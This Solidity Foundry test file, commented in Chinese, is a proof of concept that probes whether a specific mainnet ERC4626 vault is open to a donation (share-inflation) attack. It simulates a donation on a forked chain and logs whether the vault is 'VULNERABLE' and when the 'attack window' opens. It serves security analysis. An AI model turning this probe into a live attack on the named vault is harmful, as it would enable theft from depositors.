// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// Vault 0x7751 Donation Attack PoC (Delayed Sensitivity)
//
// @KeyInfo
// Vault Address: 0x7751e2f4b8ae93ef6b79d86419d42fe3295a4559
// Deploy Block: 20,829,243
// Min Attack Block: 20,894,195 (+64,952 blocks = ~9 days)
// Lending Platform: Morpho v1
//
// @SpecialHandling
// 这个 vault 部署后 9 天才变敏感
// 需要fork 到 min_attack_block (20,894,195) 而不是部署区块
// 在这个区块 vault 可能已有大量存款
//
// @AttackType
// ERC4626 Inflation Attack with Delayed Sensitivity
//
// @Strategy
// fork 到 min_attack_block 分析 vault 状态
// 验证 donation attack 是否可行
// ===========================================================================

import "../basetest.sol";
import {IERC20} from "../interface.sol";

// ---------------------------------------------------------------------------
// 接口定义
// ---------------------------------------------------------------------------

interface IERC4626Vault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

// ---------------------------------------------------------------------------
// 主测试合约
// ---------------------------------------------------------------------------

contract Vault_0x7751_DonationPoC is BaseTestWithBalanceLog {
    // === 地址常量 ===
    IERC4626Vault internal constant VAULT = IERC4626Vault(0x7751E2F4b8ae93EF6B79d86419d42FE3295A4559);
    
    // === Fork 区块 - min_attack_block (延迟敏感) ===
    uint256 internal constant DEPLOY_BLOCK = 20_829_243;
    uint256 internal constant MIN_ATTACK_BLOCK = 20_894_195; // +64,952 blocks (~9 days)

    // === 攻击参数 ===
    uint256 internal constant DONATION_AMOUNT = 1000 * 1e18; // 1000 tokens

    // === 测试账户 ===
    address internal constant ATTACKER = address(0xdead);
    address internal constant VICTIM = address(0xbeef);

    // === 运行时变量 ===
    IERC20 internal assetToken;
    uint256 internal actualForkBlock;
    uint8 internal assetDecimals;

    function setUp() public {
        // 使用 min_attack_block 而不是 deploy_block
        actualForkBlock = MIN_ATTACK_BLOCK;
        vm.createSelectFork("mainnet", actualForkBlock);
        
        // 获取底层资产
        address assetAddr = VAULT.asset();
        assetToken = IERC20(assetAddr);
        fundingToken = assetAddr;
        assetDecimals = _getDecimals(assetAddr);

        vm.label(address(VAULT), "Vault");
        vm.label(assetAddr, "Asset");
        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");

        // 打印初始状态
        emit log_string("=== Setup: Checking Vault State at Min Attack Block ===");
        emit log_string("NOTE: This vault has delayed sensitivity (~9 days after deploy)");
        emit log_named_uint("Deploy Block", DEPLOY_BLOCK);
        emit log_named_uint("Min Attack Block", actualForkBlock);
        emit log_named_uint("Block Difference", actualForkBlock - DEPLOY_BLOCK);
        emit log_named_address("Vault", address(VAULT));
        emit log_named_address("Asset", assetAddr);
        emit log_named_decimal_uint("Vault.totalSupply()", VAULT.totalSupply(), assetDecimals);
        emit log_named_decimal_uint("Vault.totalAssets()", VAULT.totalAssets(), assetDecimals);
        emit log_named_decimal_uint("Asset.balanceOf(vault)", assetToken.balanceOf(address(VAULT)), assetDecimals);
    }

    // =========================================================================
    // 辅助函数
    // =========================================================================
    function _getDecimals(address token) internal returns (uint8) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSignature("decimals()"));
        if (success && data.length > 0) {
            return abi.decode(data, (uint8));
        }
        return 18;
    }

    function _setTokenBalance(address token, address account, uint256 amount) internal {
        // 优先使用 deal()（Foundry 内置，能自动定位正确的 storage slot）
        try this._doDeal(token, account, amount) {
            if (IERC20(token).balanceOf(account) == amount) return;
        } catch {}

        // Fallback: 手动查找 balance slot (用于 proxy/rebasing token)
        uint256 currentBalance = IERC20(token).balanceOf(account);
        uint256[] memory slots = new uint256[](8);
        slots[0] = 0; slots[1] = 1; slots[2] = 2; slots[3] = 3;
        slots[4] = 4; slots[5] = 5; slots[6] = 51; slots[7] = 101;

        for (uint256 i = 0; i < slots.length; i++) {
            bytes32 slot = keccak256(abi.encode(account, slots[i]));
            uint256 storedVal = uint256(vm.load(token, slot));
            if (storedVal == currentBalance) {
                vm.store(token, slot, bytes32(amount));
                if (IERC20(token).balanceOf(account) == amount) return;
                vm.store(token, slot, bytes32(storedVal)); // 恢复
            }
        }
    }

    function _doDeal(address token, address to, uint256 amount) external {
        require(msg.sender == address(this), "only self");
        deal(token, to, amount);
    }

    // =========================================================================
    // Test 1: 验证 vault 在 min_attack_block 的状态
    // =========================================================================
    function testDonationSensitivity() public {
        emit log_string("=== Test 1: Donation Sensitivity Check ===");
        emit log_named_uint("Fork Block (Min Attack Block)", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();
        uint256 vaultBalanceBefore = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, assetDecimals);
        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, assetDecimals);
        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, assetDecimals);

        // 检查 vault 是否已有存款
        if (totalSupplyBefore > 0) {
            emit log_string("[INFO] Vault already has deposits at min_attack_block");
            emit log_string("     This is expected for delayed sensitivity vault");
        } else {
            emit log_string("[INFO] Vault is empty at min_attack_block");
        }

        // 使用 vm.store 给 vault 增加余额 (模拟 donation)
        _setTokenBalance(address(assetToken), address(VAULT), vaultBalanceBefore + DONATION_AMOUNT);

        uint256 totalAssetsAfter = VAULT.totalAssets();
        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfter, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);

        // 检查 totalAssets 是否跟踪 balance
        uint256 assetIncrease = 0;
        if (totalAssetsAfter > totalAssetsBefore) {
            assetIncrease = totalAssetsAfter - totalAssetsBefore;
        }
        uint256 balanceIncrease = vaultBalanceAfter - vaultBalanceBefore;

        emit log_named_decimal_uint("Asset Increase", assetIncrease, assetDecimals);
        emit log_named_decimal_uint("Balance Increase", balanceIncrease, assetDecimals);

        if (assetIncrease == 0) {
            emit log_string("[INFO] totalAssets DID NOT change after donation");
            emit log_string("[FINDING] Vault uses INTERNAL ACCOUNTING (not balance-based)");
            emit log_string("[CONCLUSION] Classic donation attack NOT applicable");
        } else if (assetIncrease == balanceIncrease) {
            emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
            emit log_string("[WARNING] Vault may be VULNERABLE to donation attack");
        } else {
            emit log_string("[INFO] totalAssets changed but != balance increase");
            emit log_string("[FINDING] Vault has hybrid accounting");
        }

        // 断言
        require(assetIncrease == balanceIncrease || assetIncrease == 0, 
            "Unexpected vault behavior");
    }

    // =========================================================================
    // Test 2: 验证 donation 导致 share price 膨胀
    // =========================================================================
    function testDonationAttack() public balanceLog {
        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();

        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, assetDecimals);
        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, assetDecimals);

        // 执行 donation
        emit log_string("=== Simulating donation via vm.store ===");
        uint256 currentBalance = assetToken.balanceOf(address(VAULT));
        _setTokenBalance(address(assetToken), address(VAULT), currentBalance + DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);

        // 分析结果
        uint256 assetIncrease = 0;
        if (totalAssetsAfterDonation > totalAssetsBefore) {
            assetIncrease = totalAssetsAfterDonation - totalAssetsBefore;
        }
        
        if (assetIncrease > 0) {
            emit log_string("[PASS] Donation successfully affected totalAssets");
            if (totalSupplyBefore > 0) {
                uint256 sharePriceBefore = totalAssetsBefore * 1e18 / totalSupplyBefore;
                uint256 sharePriceAfter = totalAssetsAfterDonation * 1e18 / totalSupplyBefore;
                uint256 inflationMultiplier = sharePriceAfter * 1e18 / sharePriceBefore;
                emit log_named_decimal_uint("Share Price Inflation (x)", inflationMultiplier, 18);
            }
        } else {
            emit log_string("[INFO] Donation had no effect on totalAssets");
            emit log_string("[PASS] Vault is IMMUNE to donation attack");
        }
    }

    // =========================================================================
    // Test 3: 完整攻击分析
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== Test 3: Full Donation Attack Analysis ===");
        emit log_string("=== Vault with Delayed Sensitivity (~9 days) ===");
        emit log_string("============================================================");
        emit log_named_uint("Deploy Block", DEPLOY_BLOCK);
        emit log_named_uint("Min Attack Block", actualForkBlock);
        emit log_named_uint("Block Difference", actualForkBlock - DEPLOY_BLOCK);

        // 记录初始状态
        uint256 initialTotalSupply = VAULT.totalSupply();
        uint256 initialTotalAssets = VAULT.totalAssets();
        uint256 initialVaultBalance = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, assetDecimals);
        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, assetDecimals);
        emit log_named_decimal_uint("Initial Vault Balance", initialVaultBalance, assetDecimals);

        // =============================================================
        // Step 1: 模拟 donation
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 1: Simulating donation ===");
        
        _setTokenBalance(address(assetToken), address(VAULT), initialVaultBalance + DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfterDonation = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, assetDecimals);
        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfterDonation, assetDecimals);

        // =============================================================
        // Step 2: 分析结果
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 2: Analyzing results ===");

        uint256 assetIncrease = 0;
        if (totalAssetsAfterDonation > initialTotalAssets) {
            assetIncrease = totalAssetsAfterDonation - initialTotalAssets;
        }
        uint256 balanceIncrease = vaultBalanceAfterDonation - initialVaultBalance;
        
        bool totalAssetsChanged = (assetIncrease > 0);
        bool totalAssetsEqualsBalanceIncrease = (assetIncrease == balanceIncrease);

        emit log_named_uint("Total Assets Changed", totalAssetsChanged ? 1 : 0);
        emit log_named_uint("Asset Increase == Balance Increase", totalAssetsEqualsBalanceIncrease ? 1 : 0);

        // =============================================================
        // 最终分析
        // =============================================================
        emit log_string("");
        emit log_string("============================================================");
        emit log_string("=== FINAL ANALYSIS ===");
        emit log_string("============================================================");

        if (totalAssetsChanged && totalAssetsEqualsBalanceIncrease) {
            emit log_string("");
            emit log_string("[FINDING 1] Donation increased vault balance");
            emit log_string("[FINDING 2] totalAssets increase == balance increase");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault is BALANCE-BASED");
            emit log_string("             Classic donation attack is POSSIBLE");
            emit log_string("");
            emit log_string("[SECURITY STATUS] VULNERABLE to donation attack");
            emit log_string("");
            emit log_string("[NOTE] Attack window opens ~9 days after deployment");
        } else if (!totalAssetsChanged) {
            emit log_string("");
            emit log_string("[FINDING] totalAssets did NOT change after donation");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault uses INTERNAL ACCOUNTING");
            emit log_string("             Classic donation attack is NOT possible");
            emit log_string("");
            emit log_string("[SECURITY STATUS] IMMUNE to donation attack");
        } else {
            emit log_string("");
            emit log_string("[INFO] Vault has hybrid accounting");
            emit log_string("       Further investigation needed");
        }

        emit log_string("");
        emit log_string("============================================================");
        emit log_string("[OK] Analysis completed!");
        emit log_string("NOTE: This vault has delayed sensitivity");
        emit log_string("      Attack window starts ~9 days after deployment");
        emit log_string("============================================================");
    }
}
